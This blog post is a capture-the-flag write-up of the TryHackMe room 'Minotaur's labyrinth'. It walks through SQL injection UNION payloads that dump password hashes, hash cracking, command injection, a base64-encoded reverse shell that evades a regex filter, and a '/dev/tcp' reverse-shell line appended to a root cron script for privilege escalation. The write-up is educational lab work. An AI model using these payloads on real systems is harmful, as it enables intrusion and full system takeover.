---
layout: post
current: post
cover: 'assets/images/minotaurslabyrinth/cover.png'
navigation: True
title: "Minotaur's labyrinth Write Up"
date: 2021-11-07 00:00:00
tags: [tryhackme, ctf, medium]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/minotaurslabyrinth/cover.png)

### Overview

[Minotaur's labyrinth](https://tryhackme.com/room/labyrinth8llv) is a medium rated CTF room on [TryHackMe](https://tryhackme.com) created by [xenox](https://tryhackme.com/p/xenox) and [spayc](https://tryhackme.com/p/spayc).

> The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?

### Nmap

I started a nmap scan to check for available ports.

```highlight
# Nmap 7.91 scan initiated Sun Nov  7 12:41:10 2021 as: nmap -sC -sV -oA nmap/initial 10.10.68.118
Nmap scan report for 10.10.68.118
Host is up (0.044s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, Help, Kerberos, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Host 'ip-10-8-21-217.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=11/7%Time=6187C968%P=x86_64-pc-linux-gnu%r(NU
SF:LL,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.i
SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
SF:aDB\x20server")%r(GenericLines,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-2
SF:1-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,68,"d\0\0\x01\
SF:xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x2
SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r
SF:(RTSPRequest,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
SF:is\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,68,"d\0\0\x01\xffj\x04
SF:Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStat
SF:usRequestTCP,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
SF:is\x20MariaDB\x20server")%r(Help,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8
SF:-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,68,"d\0\0
SF:\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(TerminalServerCookie,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-21
SF:7\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conne
SF:ct\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionReq,68,"d\0\0\x01\x
SF:ffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
SF:Kerberos,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.comp
SF:ute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server")%r(SMBProgNeg,68,"d\0\0\x01\xffj\x04Host\x20'ip-10
SF:-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  7 12:41:26 2021 -- 1 IP address (1 host up) scanned in 16.38 seconds
```

4 ports open:

- 21 - FTP - ProFTPD
- 80 - HTTP - Apache httpd 2.4.48
- 443 - HTTPS - Apache httpd 2.4.48
- 3306 - MYSQL - MariaDB server

### Enumeration

FTP allows anonymous access so I started by looking for anything interesting in there.

```highlight
└──╼ $ftp 10.10.68.118                                                   
Connected to 10.10.68.118.                                               
220 ProFTPD Server (ProFTPD) [::ffff:10.10.68.118]                       
Name (10.10.68.118:daz): anonymous                                       
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
226 Transfer complete
ftp> cd pub
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
226 Transfer complete
ftp> get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (140.2193 kB/s)
ftp> cd .secret
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
226 Transfer complete
ftp> cd pub
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
226 Transfer complete
ftp> get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (140.2193 kB/s)
ftp> cd .secret
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 ..
-rw-r--r--   1 root     root           30 Jun 15 19:49 flag.txt
-rw-r--r--   1 root     root          114 Jun 15 14:56 keep_in_mind.txt
226 Transfer complete
ftp> get keep_in_mind.txt
local: keep_in_mind.txt remote: keep_in_mind.txt
200 PORT command successful
150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
226 Transfer complete
114 bytes received in 0.01 secs (12.2017 kB/s)
```

Not much in there, I downloaded the message.txt and keep_in_mind.txt files.

```highlight
└──╼ $cat message.txt keep_in_mind.txt 
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

No credentials or anything that jumps out other than probably a cronjob being used somewhere that I should keep an eye out for. I turned my attention to the web ports and got a login prompt.

![login](/assets/images/minotaurslabyrinth/login.png)

I tried the normal admin/admin, admin/password etc but nothing worked. Its never going to be that easy to get root by I did click the link and just got a page with the two creators.

![roottroll](/assets/images/minotaurslabyrinth/roottroll.png)

The forget password link was also a troll!

![passwdtroll](/assets/images/minotaurslabyrinth/passwdtroll.png)

I had a look at the source but nothing jumped out expect a javascript file.

![websource](/assets/images/minotaurslabyrinth/websource.png)

Great a username 'Daedalus'! Also a basic password generating function. 

![loginjs](/assets/images/minotaurslabyrinth/loginjs.png)

Rather than doing manually, I put the function in to a python script and got the users password.

```highlight
└──╼ $cat pwdgen.py 

a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]

print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
```

I tried the username and generated password and was able to successfully login to the portal.

![loggedin](/assets/images/minotaurslabyrinth/loggedin.png)

The webpage has a simple search feature, the table looks like database columns and with the NMAP showing a SQL database its safe to assume this search function will query the database. 

I tested some basic queries and it appears the search function is vulnerable to SQLi. When I used the ```'``` character I got an error 'No callback' however if I entered ```';-- -``` I don't get an error which indicates I'm completing the SQL command by commenting out the rest of the query. 

![sqlitest](/assets/images/minotaurslabyrinth/sqlitest.gif)

Because of the output page at the bottom I assumed I could use UNION SELECT to get results from the database and display on the page. There are 3 columns on the page so I tried the UNION SELECT statement ```' union select 1,2,3;-- -```

![sqlidatabase](/assets/images/minotaurslabyrinth/sqlidatabase.gif)

So far so good! From the drop down is People & Creatures so rather enumerating for other tables I decided to look at at the columns for these tables with the command

```'UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='people';-- -```

![tablecolumns](/assets/images/minotaurslabyrinth/tablecolumns.png)

This provided the column names:

- idPeople
- namePeople
- passwordPeople
- permissionPeople

Now with the query ```'UNION SELECT 1,namePeople,passwordPeople from people;-- -``` I could get a list of the names and passwords.

![sqluserlist](/assets/images/minotaurslabyrinth/sqluserlist.png)

I also wanted to see the permissions to each person so did another query to get this information, there is probably a way to use group concat to put all the information on one line but I just did a second query.

![peoplepermission](/assets/images/minotaurslabyrinth/peoplepermission.png)

M!n0taur is an admin. I put all the names and password hashes in to a file.

```highlight
└──╼ $cat peoplecreds 
Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e
Menekrates:0b3bebe266a81fbfaa79db1604c4e67f
Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b
Daedalus:b8e4c23686a3a12476ad7779e35f5eb6
M!n0taur:1765db9457f496a39859209ee81fbda4
```

Now using the command ```hashcat -m 0 peoplecreds /usr/share/wordlists/rockyou.txt --username``` I can use hashcat to crack the hashes.

![crackedusers](/assets/images/minotaurslabyrinth/crackedusers.png)

I logged out of the portal and back in with M!n0taur's credentials and now had admin access.

![adminpage](/assets/images/minotaurslabyrinth/adminpage.png)

A new link is presented 'Secret Stuff', navigating to this page give us another input box but this time echoing what ever we enter.

![echopage](/assets/images/minotaurslabyrinth/echopage.png)

I did some basic tests and using pipe ```|``` allowed me to get command injection. 
![echotest](/assets/images/minotaurslabyrinth/echotest.gif)

### Initial Access

With the ability to run commands on the target I tried to get a reverseshell back to my machine, however none of my payloads worked and I got the following message.

![errormessage](/assets/images/minotaurslabyrinth/errormessage.png)

Because I could execute commands, I ran ```ls``` and could see the echo.php page I was trying to exploit, I used ```cat``` to reach the source code and found a regex checking my input.

![regex](/assets/images/minotaurslabyrinth/regex.gif)

A good resource for testing regex is [https://regexr.com](https://regexr.com), I put in the expression and could see a range of characters are being matched, all the reverse shell payloads were matching the expression. 

![regexcompare](/assets/images/minotaurslabyrinth/regexcompare.png)

So so get around this, I encoded my payload as base64, another great resource is [https://www.revshells.com](https://www.revshells.com). Put in your IP and port and you can pick the type of reverse shell you want and then encode it with base64. 

![genshell](/assets/images/minotaurslabyrinth/genshell.png)

I used the python3 payload, once thing to note is the regex will check for ```=``` so your payload must not need padding once encoded to base64.

Now with my payloaded encoded, I started a listener and on the echo page I entered ```<base64 string> | base64 -d | bash```

```highlight
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 41916
bash: /root/.bashrc: Permission denied
daemon@labyrinth:/opt/lampp/htdocs$ 
```

I finally had a shell!

### Priv Esc

While enumerating the machine I found a folder called 'reminders' which is not a standard folder.

```highlight
daemon@labyrinth:/$ ls
ls
bin    home            lost+found  reminders  srv       usr
boot   initrd.img      media       root       swapfile  var
cdrom  initrd.img.old  mnt         run        sys       vmlinuz
dev    lib             opt         sbin       timers    vmlinuz.old
etc    lib64           proc        snap       tmp
daemon@labyrinth:/$ cd reminders
cd reminders
daemon@labyrinth:/reminders$ ls -lah
ls -lah
total 44K
drwxr-xr-x  2 root root 4,0K jún   15 17:25 .
drwxr-xr-x 26 root root 4,0K szept 20 08:42 ..
-rw-r--r--  1 root root  31K nov    7 14:36 dontforget.txt
daemon@labyrinth:/reminders$ date
date
2021. nov. 7., vasárnap, 14:36:07 CET
daemon@labyrinth:/reminders$ 
daemon@labyrinth:/reminders$ tail dontforget.txt
tail dontforget.txt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
```

The 'dontforget.txt' file is being regularly updated, thinking back at the text files from the FTP service there is probably a cron job running. Looking around the machine further I found a timers folder.

```highlight
daemon@labyrinth:/reminders$ cd /timers
cd /timers
daemon@labyrinth:/timers$ ls
ls
timer.sh
daemon@labyrinth:/timers$ ls -lah timer.sh
ls -lah timer.sh
-rwxrwxrwx 1 root root 117 nov    7 14:38 timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
daemon@labyrinth:/timers$ 
```

This is the script adding entries to the text file in the reminders folder and we have full write access. So I appended another reverse shell now calling port 5555.

```highlight
daemon@labyrinth:/timers$ echo '/bin/bash -i >& /dev/tcp/THMVPNIP/5555 0>&1' >> timer.sh
<h -i >& /dev/tcp/THMVPNIP/5555 0>&1' >> timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
/bin/bash -i >& /dev/tcp/THMVPNIP/5555 0>&1
```

Started a listener and waiting for the script to run and got a shell as root!

```highlight
└──╼ $nc -nvlp 5555
listening on [any] 5555 ...
connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 38120
bash: cannot set terminal process group (6018): Inappropriate ioctl for device
bash: no job control in this shell
root@labyrinth:~# 
```

Thanks for reading!

============================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

